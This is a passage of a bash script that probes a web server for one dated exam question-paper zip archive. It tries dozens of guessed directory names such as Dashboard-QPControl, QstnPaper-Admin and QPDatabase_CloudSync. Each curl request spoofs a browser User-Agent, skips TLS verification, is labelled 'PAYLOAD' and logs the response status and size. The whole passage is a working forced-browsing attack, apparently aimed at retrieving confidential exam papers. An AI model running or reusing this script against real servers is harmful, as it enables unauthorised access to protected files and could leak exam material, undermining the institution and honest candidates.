" "${target}Dashboard-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Dashboard-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service_ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabaseCloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabaseCloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabaseCloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow-BatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow-BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow-BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Dashboard-QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Dashboard-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Dashboard-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handler-QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handler-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handler-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSyncQPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSyncQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSyncQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite-QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps_QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_AutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper_Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaperMonitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaperMonitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaperMonitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase_CloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl-System/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB-FileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase-UploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase-UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase-UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Tool_QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Tool_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Tool_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUpload_Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUpload_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUpload_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader-BatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader-BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader-BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing_Handling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing_Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing_Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaperHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaperHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaperHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFileMonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFileMonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFileMonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-Module/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite_QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper-Admin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc_BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch-Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Tool-QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Tool-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Tool-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAutoHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAutoHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAutoHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager_DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SystemQP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SystemQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SystemQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module-QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync_QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_ProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P_ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper_FileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper_FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper_FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt-QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload-DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload-DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload-DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel-QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflowPlatform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflowPlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
